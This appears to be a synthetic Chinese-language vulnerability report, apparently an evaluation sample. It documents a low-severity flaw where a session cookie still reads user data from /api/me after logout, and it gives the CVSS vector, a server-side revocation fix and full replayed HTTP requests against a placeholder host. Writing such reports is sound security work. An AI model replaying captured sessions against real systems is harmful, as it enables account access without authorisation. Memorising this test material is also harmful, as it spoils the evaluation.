# 示例系统-登录会话退出后仍有效：原会话继续读取用户信息

CVSS 4.0：CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N  评分 2.3（低危）

## 描述
用户 A 退出登录后，使用原会话请求 `/api/me`，仍能读取 A 的用户信息。不带会话的相同请求返回 401。攻击者须已持有该会话；会话如何取得、退出后有效多久，以及写操作和账号接管均未验证。

## 修复建议
退出时由服务端撤销当前会话，并在后续请求中检查撤销状态。仅删除客户端 Cookie 不能阻止旧会话重放；当前会话实现和代码位置未核实。

## 测试过程
测试时间：2026-11-01 10:00:00（北京时间）
执行工具：未记录。先用原会话查询 `/api/me`，再请求退出，随后重放原查询；结果依次为返回用户信息、退出成功、仍返回用户信息。不带会话的查询返回 401。Burp Repeater 未实际使用；授权复测时按文末三条请求依次发送，退出后保留原 Cookie。失败尝试为不带会话的请求；有效期、改密、停用、跨设备和写操作未验证。

## 攻击链路
```text
测试人员持有用户 A 的有效会话
└─ 用户 A 退出登录
   └─ POST /api/logout
      └─ 重放原会话请求 GET /api/me，仍返回 A 的信息
```

## 证据说明
来源为离线合成报文；会话占位符不能用于真实系统。完整请求与响应按用途附在下方。

**完整请求与响应**

**退出前查询**

请求：

```http
GET /api/me HTTP/1.1
Host: report-eval.invalid
Cookie: session=<SYNTHETIC_SESSION_A>
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 31

{"id":"user-a","role":"member"}
```

**退出登录**

请求：

```http
POST /api/logout HTTP/1.1
Host: report-eval.invalid
Cookie: session=<SYNTHETIC_SESSION_A>
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 11

{"ok":true}
```

**退出后重放原会话**

请求：

```http
GET /api/me HTTP/1.1
Host: report-eval.invalid
Cookie: session=<SYNTHETIC_SESSION_A>
Content-Length: 0


```

响应：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Content-Length: 31

{"id":"user-a","role":"member"}
```

**不带会话查询**

请求：

```http
GET /api/me HTTP/1.1
Host: report-eval.invalid
Content-Length: 0


```

响应：

```http
HTTP/1.1 401 Unauthorized
Content-Type: application/json
Content-Length: 35

{"error":"authentication_required"}
```
